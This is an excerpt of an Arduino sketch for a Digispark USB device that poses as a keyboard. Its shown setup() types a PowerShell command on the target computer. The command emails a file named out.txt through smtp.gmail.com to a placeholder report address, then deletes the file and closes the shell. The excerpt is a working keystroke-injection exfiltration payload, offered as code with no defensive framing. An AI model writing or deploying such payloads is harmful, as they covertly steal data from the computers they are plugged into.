...
void setup() {
  ...
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  printText(F("$SMTPInfo = New-Object Net.Mail.SmtpClient('smtp.gmail.com', 587); $SMTPInfo.EnableSsl = $true; $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('<SENDEMAIL>', '<PASS>'); $ReportEmail = New-Object System.Net.Mail.MailMessage; $ReportEmail.From = '<SENDEMAIL>'; $ReportEmail.To.Add('<REPORTEMAIL>'); $ReportEmail.Subject = 'DigiSpark Report'; $ReportEmail.Body = 'Attached is your report. - Regards Your Digispark'; $ReportEmail.Attachments.Add('out.txt'); $SMTPInfo.Send($ReportEmail);"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(4000);
  printText(F("del out.txt"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  printText(F("exit"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
